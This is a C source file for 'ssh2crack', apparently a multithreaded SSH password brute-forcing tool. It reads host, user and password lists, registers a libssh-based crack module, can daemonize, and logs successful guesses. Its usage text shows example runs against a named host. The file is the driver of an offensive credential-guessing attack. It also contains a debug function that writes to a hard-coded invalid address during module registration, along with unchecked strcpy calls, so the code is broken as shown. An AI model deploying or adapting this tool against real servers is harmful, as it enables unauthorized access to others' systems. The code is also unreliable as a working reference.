/*
 * ssh2crack.c	(c) 2012 wzt http://www.cloud-sec.org
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <assert.h>
#include <libssh/libssh.h>
#include <libssh/callbacks.h>

#include "libsock.h"
#include "slab.h"
#include "thread_pool.h"
#include "ssh2crack.h"
#include "ssh.h"
#include "trace.h"

struct thread_mem *main_thread_mem;
struct slab_cache *user_cache, *host_cache, *worker_cache;
struct list_head thread_mem_list_head;

int host_list_len = 0;
int user_list_len = 0;
int passwd_list_len = 0;

SSH2CRACK_OPT *init_opt(void)
{
	SSH2CRACK_OPT *crack_opt = NULL;

	crack_opt = (SSH2CRACK_OPT *)malloc(sizeof(SSH2CRACK_OPT));
	if (!crack_opt) {
		fprintf(stdout, "[-] Malloc failed.\n");
		return NULL;
	}

	crack_opt->status = 0;
	crack_opt->len = 0;
	INIT_LIST_HEAD(&(crack_opt->list_head));

	return crack_opt;
}

SSH2CRACK_ARG *init_arg(void)
{
	SSH2CRACK_ARG *crack_arg = NULL;

	crack_arg = (SSH2CRACK_ARG *)malloc(sizeof(SSH2CRACK_ARG));
	if (!crack_arg) {
		fprintf(stdout, "[-] Malloc failed.\n");
		return NULL;
	}

	crack_arg->timeout = DEFAULT_TIMEOUT;
	crack_arg->thread_num = DEFAULT_THREAD_NUM;
	crack_arg->daemon = DEFAULT_DAEMON_STATUS;
	strcpy(crack_arg->log, DEFAULT_LOG);

	return crack_arg;
}

CRACK_USER *alloc_user_node(void)
{
	CRACK_USER *crack_node = NULL;

#ifdef SLAB
	crack_node = (CRACK_USER *)kmem_cache_alloc(user_cache);
	if (!crack_node) {
		fprintf(stdout, "[-] Malloc failed.\n");
		return NULL;
	}
#else
	crack_node = (CRACK_USER *)malloc(sizeof(CRACK_USER));
	if (!crack_node) {
		fprintf(stdout, "[-] Malloc failed.\n");
		return NULL;
	}
#endif
	memset((void *)crack_node, '\0', sizeof(CRACK_USER));

	return crack_node;
}


CRACK_PASSWD *alloc_passwd_node(void)
{
	return (CRACK_PASSWD *)alloc_user_node();
}

CRACK_HOST *alloc_host_node(void)
{
	CRACK_HOST *crack_node = NULL;

#ifdef SLAB
	crack_node = (CRACK_HOST *)kmem_cache_alloc(host_cache);
	if (!crack_node) {
		fprintf(stdout, "[-] Malloc failed.\n");
		return NULL;
	}
#else
	crack_node = (CRACK_HOST *)malloc(sizeof(CRACK_HOST));
	if (!crack_node) {
		fprintf(stdout, "[-] Malloc failed.\n");
		return NULL;
	}
#endif
	memset((void *)crack_node, '\0', sizeof(CRACK_HOST));

	return crack_node;
}

int init_user_list(char *file, SSH2CRACK_OPT *crack_opt) 
{
	CRACK_USER *crack_node;
	FILE *fp;
	char buff[128];
	int idx = 0;

	if (!(fp = fopen(file, "r"))) {
		perror("fopen");
		return -1;
	}

	while (fgets(buff, 128 ,fp) != NULL) {
		crack_node = alloc_user_node();;
		if (!crack_node) {
			fprintf(stdout, "[-] Malloc failed.\n");
			return -1;
		}

		buff[strlen(buff) - 1] = '\0';
		crack_opt->len++;
		crack_node->index = idx++;
		strcpy(crack_node->data, buff);
		list_add_tail(&(crack_node->list), &(crack_opt->list_head));
	}

	fclose(fp);
	return 0;
}

int init_passwd_list(char *file, SSH2CRACK_OPT *crack_opt)
{
	return init_user_list(file, crack_opt);
}

int fix_host_list(struct list_head *list_head)
{
	CRACK_HOST *s = NULL;
	struct list_head *p = NULL;

	list_for_each(p, list_head) {
		s = list_entry(p, CRACK_HOST, list);
		if (s) {
			s->user_map = (unsigned int *)malloc(sizeof(int) * user_opt->len);
			if (!s->user_map)
				return -1;
			memset(s->user_map, 0, sizeof(int) * user_opt->len);
			s->total_user = user_opt->len;
		}
	}

	return 0;
}

int init_host_list(char *file, SSH2CRACK_OPT *crack_opt)
{
        CRACK_HOST *crack_node;
        FILE *fp;
        char buff[128];

        if (!(fp = fopen(file, "r"))) {
                perror("fopen");
                return -1;
        }
        //fprintf(stdout, "[+] Open %s ok.\n", file);

        while (fgets(buff, 128 ,fp) != NULL) {
                crack_node = alloc_host_node();
                if (!crack_node) {
                        fprintf(stdout, "[-] Malloc failed.\n");
                        return -1;
                }

                buff[strlen(buff) - 1] = '\0';
                crack_opt->len++;
		crack_node->current_user = 0;
                strcpy(crack_node->data, buff);
                list_add_tail(&(crack_node->list), &(crack_opt->list_head));
        }

        fclose(fp);
        return 0;
}

void print_list(struct list_head *list_head)
{
	CRACK_USER *s = NULL;
	struct list_head *p = NULL;

	list_for_each(p, list_head) {
		s = list_entry(p, CRACK_USER, list);
		if (s) {
			printf("%s\n", s->data);
		}
	}
}

void print_host_list(struct list_head *list_head)
{
	CRACK_HOST *s = NULL;
	struct list_head *p = NULL;

	list_for_each(p, list_head) {
		s = list_entry(p, CRACK_HOST, list);
		if (s) {
			printf("%s\n", s->data);
		}
	}
}

int init_log(char *path)
{
	result_fp = fopen(path, "a+");
	if (!result_fp) {
		perror("fopen");
		return -1;
	}

	pthread_mutex_init(&file_lock, NULL);
	return 0;
}

int handle_user_arg(char *optarg)
{
        CRACK_USER *node;

        memset(ssh2crack_arg->user, '\0', 64);
        strcpy(ssh2crack_arg->user, optarg);

        node = alloc_user_node();
        if (!node)
                return -1;

        user_opt->len++;
	node->index = 0;
        strcpy(node->data, ssh2crack_arg->user);
        list_add_tail(&(node->list), &(user_opt->list_head));

        return 0;
}

int handle_user_list_arg(char *optarg)
{
	memset(ssh2crack_arg->user_list, '\0', 128);
	strcpy(ssh2crack_arg->user_list, optarg);
      
	if (init_user_list(ssh2crack_arg->user_list, user_opt) == -1)
		return -1;

	return 0;
}

int handle_passwd_arg(char *optarg)
{
        CRACK_PASSWD *node;

        memset(ssh2crack_arg->passwd, '\0', 64);
        strcpy(ssh2crack_arg->passwd, optarg);

        node = alloc_passwd_node();
        if (!node)
                return -1;

        passwd_opt->len++;
        strcpy(node->data, ssh2crack_arg->passwd);
        list_add_tail(&(node->list), &(passwd_opt->list_head));

        return 0;
}

int handle_passwd_list_arg(char *optarg)
{
	memset(ssh2crack_arg->passwd_list, '\0', 128);
	strcpy(ssh2crack_arg->passwd_list, optarg);
       
	if (init_passwd_list(ssh2crack_arg->passwd_list, passwd_opt) == -1)
		return -1;
	
	return 0;
}

int handle_host_arg(char *optarg)
{
        CRACK_HOST *node;

        memset(ssh2crack_arg->host, '\0', 64);
        strcpy(ssh2crack_arg->host, optarg);

        node = alloc_host_node();
        if (!node)
                return -1;

	host_opt->len++;
	node->current_user = 0;
        strcpy(node->data, ssh2crack_arg->host);
        list_add_tail(&(node->list), &(host_opt->list_head));

        return 0;
}

int handle_host_list_arg(char *optarg)
{
	memset(ssh2crack_arg->host_list, '\0', 128);
	strcpy(ssh2crack_arg->host_list, optarg);

	if (init_host_list(ssh2crack_arg->host_list, host_opt) == -1)
		return -1;
	
	return 0;
}

void display_status(void)
{
        fprintf(stdout, "Crack engine - Host: %d | User: %d | Passwd: %d | Threads: %d | "
                        "timeout: %d| log: %s\n\n",
			host_opt->len, user_opt->len, passwd_opt->len,
                        ssh2crack_arg->thread_num, ssh2crack_arg->timeout,
                        ssh2crack_arg->log);
}

void ssh2crack_banner(void)
{
	fprintf(stdout, "%s %s\t%s - %s\n", SSH2CRACK_BANNER, 
			SSH2CRACK_VERSION, SSH2CRACK_AUTHOR, SSH2CRACK_DESC);
}

void ssh2crack_usage(char *proc_name)
{
	ssh2crack_banner();

	fprintf(stdout, "\n%s [-l USER|-L USER.lst] [-h HOST|-H HOST.lst] "
			"[-p PASSWORD|-P PASSWORD.lst] [-o log] [-t timeout]"
			" [-n threads] [-v|V] [-d] [-m] [-e]\n\n"
			"Options:\n"
			"  -l\t\tlogin user name.\n"
			"  -L\t\tlogin user file list.\n"
			"  -h\t\ttarget host.\n"
			"  -H\t\ttarget host list.\n"
			"  -p\t\tsingle password.\n"
			"  -P\t\tpassword file list.\n"
			"  -m\t\tmodule name: ssh, ftp.\n"
			"  -e\t\tprint module list.\n"
			"  -o\t\tlog file, default is log\n"
			"  -t\t\ttimeout, deafult is 5 second.\n"
			"  -n\t\tthread nums, default is 5.\n"
			"  -v|V\t\tdisplay banner information.\n"
			"  -d\t\trun as a daemon.\n"
			"\nExamples:\n"
			"  ssh2crack -l root -h www.thc.org -P pass.lst\n"
			"  ssh2crack -L user.lst -H host.lst -P pass.lst\n"
			"  ssh2crack -L user.lst -H host.lst -P pass.lst -t 5 -n 5 -d\n", 
			proc_name);
}

void ssh2crack_mem_init(void)
{
	INIT_LIST_HEAD(&thread_mem_list_head);

	main_thread_mem = mem_cache_init(NULL, SLAB_SIZE_NUM);
	assert(main_thread_mem != NULL);

	user_cache = kmem_cache_create(main_thread_mem, "user_cache", 
		sizeof(CRACK_USER));
	assert(user_cache != NULL);

	host_cache = kmem_cache_create(main_thread_mem, "host_cache", 
		sizeof(CRACK_HOST));
	assert(host_cache != NULL);

	worker_cache = kmem_cache_create(main_thread_mem, "worker_cache", 
		sizeof(THREAD_WORKER));
	assert(host_cache != NULL);
}

void print_module_list(struct list_head *list_head)
{
        CRACK_MODULE *s = NULL;
        struct list_head *p = NULL;

	fprintf(stdout, "Current crack module:\n\n");
        list_for_each(p, list_head) {
                s = list_entry(p, CRACK_MODULE, list);
                if (s) {
                        printf("%s\n", s->name);
                }
        }
}

void test()
{
	int *p = 0x12345678;
	*p = 1;
}

int register_crack_module(char *module_name, crack_fn fn, unsigned int timeout,
		unsigned int port)
{
	CRACK_MODULE *crack_module;

	crack_module = (CRACK_MODULE *)malloc(sizeof(CRACK_MODULE));
	if (!crack_module) {
		fprintf(stderr, "malloc failed.\n");
		return -1;
	}

	strcpy(crack_module->name, module_name);
	crack_module->timeout = timeout;
	crack_module->port = port;
	crack_module->crack_cb = fn;

	test();
	list_add_tail(&(crack_module->list), &(crack_module_mnt->list_head));

	//calltrace();
	
	return 0;
}

int unregister_crack_module(char *module_name)
{
        CRACK_MODULE *s = NULL;
        struct list_head *p = NULL;

        list_for_each(p, (&crack_module_mnt->list_head)) {
                s = list_entry(p, CRACK_MODULE, list);
                if (s && !strcmp(s->name, module_name)) {
			list_del(p);
			free(s);
			return 0;
                }
        }
	
	return -1;
}

int __parse_crack_module(char *module_name)
{
	//calltrace();
	if (!strcmp(module_name, "ssh")) {
		ssh_threads_set_callbacks(ssh_threads_get_pthread());
		ssh_init();

		return register_crack_module(module_name, ssh2_connect, 
				SSH_TIMEOUT, SSH_PORT);
	}
	else if (!strcmp(module_name, "ftp")) {
		
	}

	return -1;
}

int parse_crack_module(char *arg)
{
	char tmp[64];
	char *s, *p;

	s = arg; p = tmp; 
	while (*s) {
		if (*s == ',') {
			*p = '\0';
			printf("!%s\n", tmp);
			if (__parse_crack_module(tmp) == -1) {
				fprintf(stderr, "Register module %s failed.\n", tmp);
				return -1;
			}
			memset(tmp, '\0', 64);
			p = tmp; s++;
			continue;
		}
		*p++ = *s++;
	}
	*p = '\0';
	if (__parse_crack_module(tmp) == -1) {
		fprintf(stderr, "Register module %s failed.\n", tmp);
		return -1;
	}

	return 0;	
}

void crack_module_init(void)
{
	crack_module_mnt = (CRACK_MODULE_MNT *)malloc(sizeof(CRACK_MODULE_MNT));
	if (!crack_module_mnt) {
		fprintf(stderr, "malloc failed.\n");
		exit(-1);
	}

	crack_module_mnt->module_num = 0;
	INIT_LIST_HEAD(&(crack_module_mnt->list_head));
}

#define DESTROY_MODULE(type, link_head) {	               	\
        type *p = NULL;                                         \
        struct list_head *s = NULL;                             \
        struct list_head *q = NULL;                             \
        for (s = (&link_head)->next; s != &link_head; s = q) {  \
                if (!s)                                         \
                        return ;                                \
                q = s->next;                                    \
                p = list_entry(s, type, list);                  \
                if (p) {                                        \
                        list_del(s);                            \
                        free(p);		          	\
                        p = NULL;                               \
                }                                               \
        }}

void crack_module_destroy(void)
{
	DESTROY_MODULE(CRACK_MODULE, crack_module_mnt->list_head);
}

int main(int argc, char **argv)
{
	int c;

	if (argc == 1) {
		ssh2crack_usage(argv[0]);
		return 0;
	}

	if (init_calltrace() == -1) {
		fprintf(stderr, "calltrace init failed.\n");
		return -1;
	}

	if (!(user_opt = init_opt()) || !(host_opt = init_opt()) ||
		!(passwd_opt = init_opt()) || !(ssh2crack_arg = init_arg()))
		return -1;

	ssh2crack_mem_init();
	crack_module_init();

	while ((c = getopt(argc, argv, "l:L:h:H:p:P:o:t:m:e:n:vV:d")) != -1) {
		switch (c) {
		case 'l':
			if (handle_user_arg(optarg) == -1)
				return -1;
			break;
		case 'L':
			if (handle_user_list_arg(optarg) == -1)
				return -1;
			break;
		case 'h':
			if (handle_host_arg(optarg) == -1)
				return -1;
			break;
		case 'H':
			if (handle_host_list_arg(optarg) == -1)
				return -1;
			break;
		case 'p':
			if (handle_passwd_arg(optarg) == -1)
				return -1;
			break;
		case 'P':
			if (handle_passwd_list_arg(optarg) == -1)
				return -1;
			break;
		case 'm':
			if (parse_crack_module(optarg) == -1)
				return -1;
			break;
		case 'e':
			print_module_list(&(crack_module_mnt->list_head));
			break;
		case 'o':
			memset(ssh2crack_arg->log, '\0', 128);
			strcpy(ssh2crack_arg->log, optarg);
			break;
		case 't':
			ssh2crack_arg->timeout = atoi(optarg);
			break;
		case 'n':
			ssh2crack_arg->thread_num = atoi(optarg);
			break;
		case 'd':
			ssh2crack_arg->daemon = 1;
			break;
		case 'v':
		case 'V':
			ssh2crack_banner();
			return 0;
		default:
			fprintf(stderr, "[-] Wrong option.\n");
			return -1;
		}
	}	

	fix_host_list(&(host_opt->list_head));
	signal(SIGINT, handle_sigint);

	init_log(ssh2crack_arg->log);
	display_status();
/*
	print_module_list(&(crack_module_mnt->list_head));
	unregister_crack_module("ssh");
	print_module_list(&(crack_module_mnt->list_head));

	printf("----------------\n");
	print_list(&(user_opt->list_head));
	printf("----------------\n");
	print_host_list(&(host_opt->list_head));
	printf("----------------\n");
	print_list(&(passwd_opt->list_head));
	printf("----------------\n");
*/

	if (ssh2crack_arg->daemon == 1)
		daemon(0, 0);

	if (init_thread_pool(ssh2crack_arg->thread_num) == -1)
		return -1;

	if (start_add_worker_thread() == -1) 
		return -1;

	sleep(1);
	wait_all_thread_finsh();
	fclose(result_fp);
	crack_module_destroy();
	exit_calltrace();

	return 0;
}
